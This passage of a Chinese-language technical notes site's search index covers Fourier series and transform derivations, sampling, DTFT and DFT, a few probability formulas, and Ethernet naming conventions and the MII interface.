\u200b\u7ec4\u6210\u200b\u7684\u200b\u6b63\u4ea4\u200b\u51fd\u6570\u200b\u96c6\u4e0a\u200b\u7684\u200b\u5206\u89e3\u200b\u3002\u200b\u5b9a\u4e49\u200b\u6b63\u4ea4\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u5b9a\u4e49\u200b\u5185\u79ef\u200b\uff1a\u200b\u4e24\u4e2a\u200b\u51fd\u6570\u200b\u7684\u200b\u5185\u79ef\u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u4e0a\u200b\u4e24\u4e2a\u200b\u51fd\u6570\u200b\u7684\u200b\u4e58\u79ef\u200b\u7684\u200b\u79ef\u5206\u200b\uff1a</p> \\[ (f \\cdot g)(x) = \\int_P f(x)g(x) \\mathrm{d} x \\] <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b \\(A_0\\) \u200b\u9879\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e2d\u200b\u5206\u5b50\u200b\u662f\u200b 1\uff0c\u200b\u5176\u4f59\u200b\u9879\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e2d\u200b\u5206\u5b50\u200b\u662f\u200b 2\u3002\u200b\u8fd9\u4e2a\u200b\u7cfb\u6570\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5185\u79ef\u200b\u6765\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b\u6b27\u62c9\u200b\u516c\u5f0f\u200b\uff1a</p> \\[ e^{ix} = \\cos(x) + i \\sin(x) \\] <p>\u200b\u53ef\u200b\u5f97\u200b</p> \\[\\begin{align} \\cos(x) &amp;= \\frac{e^{ix} + e^{-ix}}{2} \\\\ \\sin(x) &amp;= \\frac{e^{ix} - e^{-ix}}{2i} \\\\ \\end{align}\\] <p>\u200b\u5e26\u5165\u200b\u5230\u200b\u5085\u7acb\u53f6\u200b\u7ea7\u6570\u200b\u5c55\u5f00\u5f0f\u200b\uff1a</p> \\[\\begin{align} s(x) &amp;= A_0 + \\sum_{n=1}^{\\infty}(A_n \\cos(\\frac{2 \\pi nx}{P}) + B_n \\sin(\\frac{2 \\pi nx}{P})) \\\\ &amp;= A_0 + \\sum_{n=1}^{\\infty}(A_n \\frac{e^{\\frac{2 \\pi nxi}{P}} + e^{\\frac{-2 \\pi nxi}{P}}}{2} + B_n \\frac{e^{\\frac{2 \\pi nxi}{P}} - e^{\\frac{-2 \\pi nxi}{P}}}{2i}) \\\\ &amp;= A_0 + \\sum_{n=1}^{\\infty}((\\frac{A_n - B_n i}{2}) e^{\\frac{2 \\pi nxi}{P}} + \\frac{A_n + B_n i}{2} e^{\\frac{-2 \\pi nxi}{P}}) \\end{align}\\] <p>\u200b\u8bb0\u200b \\(F_n = \\frac{A_n - B_ni}{2}\\)\uff0c\u200b\u628a\u200b \\(A_n\\) \u200b\u548c\u200b \\(B_n\\) \u200b\u7684\u200b\u5b9a\u4e49\u200b\u5ef6\u62d3\u200b\u5230\u200b \\(n\\) \u200b\u4e3a\u200b\u8d1f\u6570\u200b\uff0c\u200b\u53d1\u73b0\u200b\uff1a</p> \\[\\begin{align} A_{-n} &amp;= \\frac{2}{P} \\int_P s(x) \\cos(\\frac{-2 \\pi nx}{P}) \\mathrm{d} x = A_n \\\\ B_{-n} &amp;= \\frac{2}{P} \\int_P s(x) \\sin(\\frac{-2 \\pi nx}{P}) \\mathrm{d} x = -B_n \\end{align}\\] <p>\u200b\u518d\u200b\u5e26\u5165\u200b\u5085\u7acb\u53f6\u200b\u5c55\u5f00\u5f0f\u200b\uff0c\u200b\u5f97\u5230\u200b</p> \\[\\begin{align} s(x) &amp;= A_0 + \\sum_{n=1}^{\\infty}((\\frac{A_n - B_n i}{2}) e^{\\frac{2 \\pi nxi}{P}} + \\frac{A_n + B_n i}{2} e^{\\frac{-2 \\pi nxi}{P}}) \\\\ &amp;= A_0 + \\sum_{n=1}^{\\infty}((\\frac{A_n - B_n i}{2}) e^{\\frac{2 \\pi nxi}{P}} + \\frac{A_{-n} - B_{-n} i}{2} e^{\\frac{2 \\pi (-n)xi}{P}}) \\\\ &amp;= A_0 + \\sum_{n=1}^{\\infty}((\\frac{A_n - B_n i}{2}) e^{\\frac{2 \\pi nxi}{P}}) + \\sum_{n=1}^{\\infty}(\\frac{A_{-n} - B_{-n} i}{2} e^{\\frac{2 \\pi (-n)xi}{P}}) \\\\ &amp;= A_0 + \\sum_{n=1}^{\\infty}((\\frac{A_n - B_n i}{2}) e^{\\frac{2 \\pi nxi}{P}}) + \\sum_{n=-\\infty}^{-1}(\\frac{A_n - B_n i}{2} e^{\\frac{2 \\pi nxi}{P}}) \\\\ \\end{align}\\] <p>\u200b\u8bb0\u200b \\(F_0 = A_0\\)\uff0c\u200b\u90a3\u4e48\u200b\u4e0a\u200b\u5f0f\u200b\u53ef\u4ee5\u200b\u5199\u6210\u200b\uff1a</p> \\[ s(x) = \\sum_{n=-\\infty}^{\\infty} F_n e^{\\frac{2 \\pi nxi}{P}} \\] <p>\u200b\u5176\u4e2d\u200b \\(F_0 = A_0 = \\frac{1}{P} \\int_P s(x) \\mathrm{d} x\\)\uff0c\u200b\u540c\u65f6\u200b\uff1a</p> \\[\\begin{align} F_n &amp;= \\frac{A_n - B_ni}{2} = \\frac{1}{2}(\\frac{2}{P} \\int_P s(x) \\cos(\\frac{2 \\pi nx}{P}) \\mathrm{d} x - \\frac{2}{P} \\int_P s(x) \\sin(\\frac{2 \\pi nx}{P})i \\mathrm{d} x) \\\\ &amp;= \\frac{1}{P} \\int_P s(x) e^{\\frac{-2 \\pi nxi}{P}} \\mathrm{d} x \\end{align}\\] <p>\u200b\u8fd9\u4e2a\u200b\u901a\u9879\u200b\u516c\u5f0f\u200b\u5bf9\u200b \\(n=0\\) \u200b\u4e5f\u200b\u6210\u7acb\u200b\u3002\u200b\u56e0\u6b64\u200b\u590d\u200b\u6307\u6570\u200b\u5f62\u5f0f\u200b\u7684\u200b\u5085\u7acb\u53f6\u200b\u7cfb\u6570\u200b\u4e3a\u200b\uff1a</p> \\[\\begin{align} s(x) &amp;= \\sum_{n=-\\infty}^{\\infty} F_n e^{\\frac{2 \\pi nxi}{P}} \\\\ F_n &amp;= \\frac{1}{P} \\int_P s(x) e^{\\frac{-2 \\pi nxi}{P}} \\mathrm{d} x \\end{align}\\]"},{"location":"mathematics/fourier-transform.html#_3","title":"\u5085\u7acb\u53f6\u200b\u53d8\u6362","text":"<p>\u200b\u5085\u7acb\u53f6\u200b\u7ea7\u6570\u200b\uff1a\u200b\u5bf9\u200b\u5468\u671f\u51fd\u6570\u200b\u7684\u200b\u5206\u89e3\u200b\u3002</p> <p>\u200b\u975e\u200b\u5468\u671f\u51fd\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u662f\u200b\u5468\u671f\u200b\u65e0\u7a77\u5927\u200b\u7684\u200b\u5468\u671f\u51fd\u6570\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(P \\to \\infty\\)\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b \\(F_n\\) \u200b\u4e5f\u200b\u8d8b\u5411\u4e8e\u200b\u96f6\u200b\u3002\u200b\u5982\u679c\u200b\u53bb\u6389\u200b\u7cfb\u6570\u200b \\(\\frac{1}{P}\\)\uff0c\u200b\u628a\u200b\u79ef\u5206\u200b\u4e0a\u200b\u4e0b\u9650\u200b\u66ff\u6362\u200b\u4e3a\u200b\u6b63\u8d1f\u200b \\(\\infty\\)\uff0c\u200b\u8fdb\u884c\u200b\u4ee3\u6362\u200b \\(\\xi = \\frac{n}{P}\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5085\u7acb\u53f6\u200b\u7ea7\u6570\u200b\uff1a</p> \\[ F_n = \\frac{1}{P} \\int_P s(x) e^{\\frac{-2 \\pi nxi}{P}} \\mathrm{d} x \\] <p>\u200b\u53d8\u6210\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b Fourier Transform\uff1a\u200b\u7ed9\u5b9a\u200b \\(f(x)\\)\uff0c\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u5f97\u5230\u200b \\(\\hat{f}(\\xi)\\)</p> \\[ \\hat{f}(\\xi) = \\int_{-\\infty}^{\\infty} f(x) e^{-2\\pi i \\xi x} \\mathrm{d}x \\] <p>Inverse Fourier Transform\uff1a\u200b\u7ed9\u5b9a\u200b \\(\\hat{f}(\\xi)\\)\uff0c\u200b\u5085\u7acb\u53f6\u200b\u9006\u53d8\u6362\u200b\u5f97\u5230\u200b \\(f(x)\\)</p> \\[ f(x) = \\int_{-\\infty}^{\\infty} \\hat{f}(\\xi) e^{2\\pi i \\xi x} \\mathrm{d}\\xi \\] <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u8868\u793a\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u628a\u200b \\(2 \\pi \\xi\\) \u200b\u6362\u5143\u200b\u4e3a\u200b \\(\\omega\\)\uff1a</p> \\[ \\hat{f}(\\omega) = \\int_{-\\infty}^{\\infty} f(x) e^{- i \\omega x} \\mathrm{d}x \\] \\[ f(x) = \\frac{1}{2\\pi} \\int_{-\\infty}^{\\infty} \\hat{f}(\\omega) e^{i \\omega x} \\mathrm{d}\\omega \\] <p>\u200b\u6ce8\u610f\u200b\u9006\u53d8\u6362\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b \\(\\frac{1}{2\\pi}\\)\u3002\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u4fdd\u6301\u200b\u5bf9\u79f0\u6027\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u6b63\u200b\u53d8\u6362\u200b\u7684\u200b\u65f6\u5019\u200b\u4e5f\u200b\u4e58\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b \\(\\frac{1}{\\sqrt{2\\pi}}\\)\uff1a</p> \\[ \\hat{f}(\\omega) = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} f(x) e^{- i \\omega x} \\mathrm{d}x \\] \\[ f(x) = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} \\hat{f}(\\omega) e^{i \\omega x} \\mathrm{d}\\omega \\]"},{"location":"mathematics/fourier-transform.html#_4","title":"\u5085\u7acb\u53f6\u200b\u7ea7\u6570\u200b\u548c\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u5085\u7acb\u53f6\u200b\u7ea7\u6570\u200b\uff1a</p> <ul> <li>\u200b\u9488\u5bf9\u200b\u5468\u671f\u51fd\u6570\u200b</li> <li>\u200b\u79bb\u6563\u200b\u7684\u200b\u9891\u7387\u200b</li> <li>\u200b\u5f97\u5230\u200b\u9891\u7387\u200b\u5206\u91cf\u200b\u4e0a\u200b\u7684\u200b\u6570\u503c\u200b</li> </ul> <p>\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\uff1a</p> <ul> <li>\u200b\u9488\u5bf9\u200b\u975e\u200b\u5468\u671f\u51fd\u6570\u200b</li> <li>\u200b\u8fde\u7eed\u200b\u7684\u200b\u9891\u7387\u200b</li> <li>\u200b\u5f97\u5230\u200b\u9891\u7387\u200b\u5206\u91cf\u200b\u4e0a\u200b\u7684\u200b\u5bc6\u5ea6\u200b</li> </ul>"},{"location":"mathematics/fourier-transform.html#_5","title":"\u91c7\u6837","text":"<p>\u200b\u7406\u60f3\u200b\u91c7\u6837\u200b\u662f\u200b\u5728\u200b\u65f6\u57df\u200b\u4e0a\u200b\uff0c\u200b\u4ee5\u200b\u56fa\u5b9a\u200b\u7684\u200b\u91c7\u6837\u200b\u95f4\u9694\u200b \\(T\\) \u200b\u5bf9\u200b\u4fe1\u53f7\u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u7ed9\u200b\u4fe1\u53f7\u200b\u4e58\u4ee5\u200b\u4e00\u4e2a\u200b\u51b2\u6fc0\u200b\u4e32\u200b\u51fd\u6570\u200b\uff08Dirac comb\uff09 \\(p(t)\\)\u3002\u200b\u5728\u200b\u65f6\u57df\u200b\u4e0a\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u9891\u57df\u200b\u4e0a\u200b\u505a\u200b\u5377\u79ef\u200b\u3002\u200b\u51b2\u6fc0\u200b\u4e32\u200b\u51fd\u6570\u200b \\(p(t)\\) \u200b\u5728\u200b\u9891\u57df\u200b\u4e0a\u200b\u662f\u200b \\(P(\\omega)\\)\uff0c\u200b\u5b83\u200b\u4f9d\u7136\u200b\u662f\u200b\u4e00\u4e2a\u200b\u51b2\u6fc0\u200b\u4e32\u200b\uff1a</p> \\[ p(t) = \\sum_{n = -\\infty}^{\\infty} \\delta(t - nT) \\] \\[ P(\\omega) = \\frac{2 \\pi}{T} \\sum_{n = -\\infty}^{\\infty} \\delta(\\omega - \\frac{2 \\pi}{T} n) \\] <p>\u200b\u6ce8\u200b\uff1a\u200b\u6839\u636e\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u5f62\u5f0f\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7cfb\u6570\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u5b8c\u5168\u200b\u4e00\u6837\u200b\uff0c\u200b\u4f8b\u5982\u200b\u53ef\u80fd\u200b\u6ca1\u6709\u200b \\(2 \\pi\\) \u200b\u7684\u200b\u56e0\u5b50\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u7406\u60f3\u200b\u91c7\u6837\u200b\u5728\u200b\u9891\u57df\u200b\u4e0a\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u5bf9\u200b\u4fe1\u53f7\u200b\u7684\u200b\u9891\u57df\u200b\u4ee5\u200b \\(2 \\pi / T\\) \u200b\u4e3a\u200b\u5468\u671f\u200b\u8fdb\u884c\u200b\u5468\u671f\u6027\u200b\u5ef6\u62d3\u200b\u3002</p> <p>\u200b\u5468\u671f\u6027\u200b\u5ef6\u62d3\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u9891\u8c31\u200b\u7684\u200b\u6df7\u53e0\u200b\u73b0\u8c61\u200b\u3002\u200b\u5982\u679c\u200b\u53d1\u751f\u200b\u4e86\u200b\u6df7\u53e0\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u4ece\u200b\u91c7\u6837\u200b\u540e\u200b\u7684\u200b\u4fe1\u53f7\u200b\u6062\u590d\u200b\u51fa\u200b\u539f\u59cb\u200b\u4fe1\u53f7\u200b\u3002\u200b\u4e3a\u4e86\u200b\u4e0d\u200b\u53d1\u751f\u200b\u6df7\u53e0\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u91c7\u6837\u200b\u95f4\u9694\u200b\u6ee1\u8db3\u200b Nyquist \u200b\u91c7\u6837\u200b\u5b9a\u7406\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u53d1\u751f\u200b\u6df7\u53e0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u7406\u60f3\u200b\u4f4e\u901a\u6ee4\u6ce2\u5668\u200b\uff0c\u200b\u53bb\u6389\u200b\u5468\u671f\u6027\u200b\u5ef6\u62d3\u200b\u51fa\u6765\u200b\u7684\u200b\u591a\u4f59\u200b\u9891\u8c31\u200b\uff0c\u200b\u6062\u590d\u200b\u51fa\u200b\u91c7\u6837\u200b\u524d\u200b\u7684\u200b\u539f\u59cb\u200b\u4fe1\u53f7\u200b\u3002</p>"},{"location":"mathematics/fourier-transform.html#_6","title":"\u79bb\u6563\u200b\u65f6\u95f4\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362","text":"<p>\u200b\u79bb\u6563\u200b\u65f6\u95f4\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\uff08DTFT\uff09\u200b\u662f\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u79bb\u6563\u200b\u65f6\u95f4\u200b\u7248\u672c\u200b\uff1a\u200b\u65f6\u57df\u200b\u4e0a\u200b\u662f\u200b\u79bb\u6563\u200b\u7684\u200b\u3002\u200b\u9891\u57df\u200b\u4f9d\u7136\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\u3002\u200b\u79bb\u6563\u200b\u65f6\u95f4\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u662f\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u7279\u6b8a\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u5b83\u200b\u628a\u200b\u4e00\u4e2a\u200b\u79bb\u6563\u200b\u7684\u200b\u65e0\u9650\u200b\u957f\u200b\u5e8f\u5217\u200b \\(x[n]\\)\uff0c\u200b\u5bf9\u5e94\u200b\u5230\u200b\u5355\u4f4d\u200b\u65f6\u95f4\u200b\u5468\u671f\u200b\u7684\u200b\u51b2\u6fc0\u200b\u4e32\u200b\u51fd\u6570\u200b\u7684\u200b\u5e45\u5ea6\u200b\u4e0a\u200b\uff0c\u200b\u5f97\u5230\u200b \\(f(t) = \\sum_{n=-\\infty}^{\\infty} x[n] \\delta(t-n)\\)\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\uff1a</p> \\[\\begin{align} \\hat{f}(\\omega) &amp;= \\int_{-\\infty}^{\\infty} f(t) e^{- i \\omega t} \\mathrm{d}t \\\\ &amp;= \\int_{-\\infty}^{\\infty} (\\sum_{n=-\\infty}^{\\infty} x[n] \\delta(t-n)) e^{- i \\omega t} \\mathrm{d}t \\\\ &amp;= \\sum_{n = - \\infty}^{\\infty} x[n] e^{-i \\omega n} \\end{align}\\] <p>\u200b\u4e3a\u4e86\u200b\u7b80\u5316\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8981\u6c42\u200b\u51b2\u6fc0\u200b\u4e32\u200b\u51fd\u6570\u200b\u7684\u200b\u5468\u671f\u200b\u4e3a\u200b 1\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u628a\u200b\u91c7\u6837\u7387\u200b\u5f52\u4e00\u5316\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9650\u5b9a\u200b\u79bb\u6563\u200b\u5e8f\u5217\u200b \\(x[n]\\) \u200b\u4e3a\u200b\u6709\u9650\u200b\u957f\u5ea6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u76f8\u5f53\u4e8e\u200b\u5bf9\u200b\u65f6\u57df\u200b\u4e58\u4ee5\u200b\u4e00\u4e2a\u200b\u77e9\u5f62\u200b\u7a97\u200b\u3002\u200b\u5047\u8bbe\u200b\u6709\u9650\u200b\u7684\u200b\u957f\u5ea6\u200b\u4e3a\u200b \\(L\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(n\\) \u200b\u7684\u200b\u53d6\u503c\u200b\u8303\u56f4\u200b\u4ece\u200b\u6240\u6709\u200b\u6574\u6570\u200b\u7f29\u5c0f\u200b\u5230\u200b \\(\\{0, 1, \\cdots, L-1\\}\\)\uff0c\u200b\u90a3\u4e48\u200b\u6709\u9650\u200b\u957f\u5ea6\u200b\u79bb\u6563\u200b\u5e8f\u5217\u200b\u7684\u200b\u79bb\u6563\u200b\u65f6\u95f4\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u4e3a\u200b\uff1a</p> \\[ X_{2 \\pi}(\\omega) = \\sum_{n = 0}^{L-1} x[n]e^{-i \\omega n} \\]"},{"location":"mathematics/fourier-transform.html#_7","title":"\u79bb\u6563\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362","text":"<p>\u200b\u79bb\u6563\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\uff08DFT\uff09\u200b\u662f\u200b\u5728\u200b\u79bb\u6563\u200b\u65f6\u95f4\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5728\u200b\u9891\u8c31\u200b\u4e0a\u200b \\([0, 2 \\pi)\\) \u200b\u9891\u7387\u200b\u8303\u56f4\u200b\u5185\u200b\u5747\u5300\u200b\u5730\u53d6\u200b \\(N\\) \u200b\u4e2a\u70b9\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u628a\u200b\u4e0a\u5f0f\u200b\u7684\u200b \\(\\omega\\) \u200b\u66ff\u6362\u200b\u4e3a\u200b \\(\\frac{2 \\pi k}{N}\\)\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u79bb\u6563\u200b\u5085\u7acb\u53f6\u200b\u53d8\u6362\u200b\u7684\u200b\u516c\u5f0f\u200b\uff1a</p> \\[ X_k = \\sum_{n = 0}^{L-1} x_ne^{-i \\frac{2 \\pi k}{N} n} \\] <p>\u200b\u901a\u5e38\u200b\u4f1a\u200b\u8ba9\u200b \\(N\\)\uff08\u200b\u9891\u57df\u200b\u4e0a\u70b9\u200b\u7684\u200b\u4e2a\u6570\u200b\uff09\u200b\u7b49\u4e8e\u200b \\(L\\)\uff08\u200b\u65f6\u57df\u200b\u4e0a\u70b9\u200b\u7684\u200b\u4e2a\u6570\u200b\uff09\u3002</p>"},{"location":"mathematics/fourier-transform.html#_8","title":"\u53c2\u8003","text":"<ul> <li>https://en.wikipedia.org/wiki/Fourier_transform</li> <li>https://en.wikipedia.org/wiki/Fourier_series</li> <li>https://en.wikipedia.org/wiki/Sampling_(signal_processing)</li> <li>https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem</li> </ul>"},{"location":"mathematics/probability.html","title":"\u6982\u7387\u8bba","text":"<p>\u200b\u65b9\u5dee\u200b \\(\\mathrm{Var}(X)=E((X-E(X))^2)=E(X^2)-(E(X))^2\\)</p> <p>\u200b\u534f\u65b9\u5dee\u200b \\(\\mathrm{Cov}(X, Y) = E((X-E(X) (Y-E(Y)))) = E(XY) - E(X)E(Y)\\)</p> <p>Cauchy\u2013Schwarz \u200b\u4e0d\u7b49\u5f0f\u200b \\(|E(XY)|^2 \\le E(X^2)E(Y^2)\\)</p>"},{"location":"mathematics/score.html","title":"Score","text":"<p>Score \u200b\u662f\u200b\u51fd\u6570\u200b \\(f(x)\\) \u200b\u6c42\u200b\u5bf9\u6570\u200b\u540e\u200b\u5bf9\u200b\u53c2\u6570\u200b \\(x\\) \u200b\u7684\u200b\u68af\u5ea6\u200b\uff1a</p> <p>\\(s(x) = \\frac{\\mathrm{d} \\log f(x)}{\\mathrm{d}x}\\)</p>"},{"location":"networking/ethernet.html","title":"\u4ee5\u592a\u7f51","text":""},{"location":"networking/ethernet.html#_2","title":"\u6807\u51c6","text":"<p>\u200b\u4ee5\u592a\u7f51\u200b\u7684\u200b\u6807\u51c6\u200b\u662f\u200b IEEE 802.3\uff0c\u200b\u5728\u200b\u6807\u51c6\u200b\u4e2d\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b\u4e0d\u540c\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7c7b\u4f3c\u200b 100BASE-TX \u200b\u8fd9\u79cd\u200b\u5199\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u8868\u793a\u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\uff1a</p> <ol> <li>BASE \u200b\u524d\u9762\u200b\u7684\u200b\u6570\u5b57\u200b\u8868\u793a\u200b\u901f\u7387\u200b\uff0c\u200b\u6bd4\u5982\u200b 10\uff0c100\uff0c1000\uff0c10G \u200b\u7b49\u7b49\u200b</li> <li>BASE \u200b\u4e4b\u540e\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5b57\u6bcd\u200b\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b T \u200b\u8868\u793a\u200b\u53cc\u7ede\u7ebf\u200b\uff0cS \u200b\u8868\u793a\u200b 850nm \u200b\u5149\u7ea4\u200b\uff0cL \u200b\u8868\u793a\u200b 1310nm \u200b\u5149\u7ea4\u200b\uff0cC \u200b\u8868\u793a\u200b\u540c\u8f74\u7535\u7f06\u200b</li> <li>\u200b\u4e4b\u540e\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u522b\u7684\u200b\u5b57\u6bcd\u200b\uff0c\u200b\u6bd4\u5982\u200b X \u200b\u8868\u793a\u200b 8b/10b \u200b\u6216\u8005\u200b 4b/5b\uff08FE\uff09\u200b\u7684\u200b\u7f16\u7801\u200b\uff0cR \u200b\u8868\u793a\u200b 64b/66b \u200b\u7684\u200b\u7f16\u7801\u200b</li> <li>\u200b\u4e4b\u540e\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b\u522b\u7684\u200b\u6570\u5b57\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b LAN PHY \u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b lane \u200b\u6570\u91cf\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u200b WAN PHY \u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u4f20\u8f93\u200b\u7684\u200b\u516c\u91cc\u200b\u6570\u200b</li> </ol> <p>\u200b\u8be6\u89c1\u200b Wikipedia - Ethernet Physical Layer # Naming Conventions \u200b\u548c\u200b IEEE 802.3 1.2.3 \u200b\u8282\u200b Physical Layer and media notation\uff1a</p> <pre><code>The data rate, if only a number, is in Mb/s, and if suffixed by a \u201cG\u201d, is in\nGb/s. The modulation type (e.g., BASE) indicates how encoded data is\ntransmitted on the medium. The additional distinction may identify\ncharacteristics of transmission or medium and, in some cases, the type of\nPCS encoding used (examples of additional distinctions are \u201cT\u201d for twisted\npair, \u201cB\u201d for bidirectional optics, and \u201cX\u201d for a block PCS coding used for\nthat speed of operation). Expansions for defined Physical Layer types are\nincluded in 1.4.\n</code></pre> <p>\u200b\u548c\u200b IEEE 802.3 1.4 \u200b\u8282\u200b Definitions \u200b\u4e2d\u200b\u7684\u200b\u51e0\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <ul> <li>100BASE-T: IEEE 802.3 Physical Layer specification for a 100 Mb/s CSMA/CD local area network. (See IEEE Std 802.3, Clause 22 and Clause 28.)</li> <li>100BASE-TX: IEEE 802.3 Physical Layer specification for a 100 Mb/s CSMA/CD local area network over two pairs of Category 5 twisted-pair cabling. (See IEEE Std 802.3, Clause 24 and Clause 25.)</li> <li>1000BASE-T: IEEE 802.3 Physical Layer specification for a 1000 Mb/s CSMA/CD LAN using four pairs of Category 5 balanced copper cabling. (See IEEE Std 802.3, Clause 40.)</li> <li>1000BASE-X: IEEE 802.3 Physical Layer specification for a 1000 Mb/s CSMA/CD LAN that uses a Physical Layer derived from ANSI X3.230-1994 (FC-PH) [B21]23. (See IEEE Std 802.3, Clause 36.)</li> <li>2.5GBASE-T: IEEE 802.3 Physical Layer specification for a 2.5 Gb/s LAN using four pairs of Category 5e/Class D balanced copper cabling. (See IEEE Std 802.3, Clause 126.)</li> <li>5GBASE-T: IEEE 802.3 Physical Layer specification for a 5 Gb/s LAN using four pairs of Category 5e/Class D balanced copper cabling. (See IEEE Std 802.3, Clause 126.)</li> <li>10GBASE-T: IEEE 802.3 Physical Layer specification for a 10 Gb/s LAN using four pairs of Class E or Class F balanced copper cabling. (See IEEE Std 802.3, Clause 55.)</li> </ul>"},{"location":"networking/ethernet.html#mii","title":"MII","text":"<p>MII \u200b\u63a5\u53e3\u200b\u662f\u200b MAC \u200b\u548c\u200b PHY \u200b\u4e4b\u95f4\u200b\u7684\u200b\u63a5\u53e3\u200b\u3002\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u4f1a\u200b\u4f34\u968f\u200b\u7740\u200b MDIO \u200b\u63a5\u53e3\u200b\uff0c\u200b\u6765\u200b\u8fdb\u884c\u200b\u63a7\u5236\u200b\u4fe1\u606f\u200b\u7684\u200b\u4f20\u8f93\u200b\u3002\u200b\u5b83\u200b\u53c8\u200b\u5206\u200b\u4e0d\u540c\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li>Standard MII\uff1a\u200b\u901f\u7387\u200b\u662f\u200b 100Mbps\uff0825MHz*4\uff09\u200b\u6216\u8005\u200b 10Mbps\uff082.5Mhz*4\uff09\uff0cTX 7 \u200b\u6839\u7ebf\u200b\uff084 DATA+CLK+EN+ER\uff09\uff0cRX 7+2 \u200b\u6839\u7ebf\u200b\uff084 DATA+CLK+DV+ER+CRS+COL\uff09\uff0c\u200b\u52a0\u4e0a\u200b MDIO 2 \u200b\u6839\u7ebf\u200b\u5171\u200b 18 \u200b\u6839\u7ebf\u200b</li> <li>RMII\uff1a\u200b\u901f\u7387\u200b\u662f\u200b 100Mbps 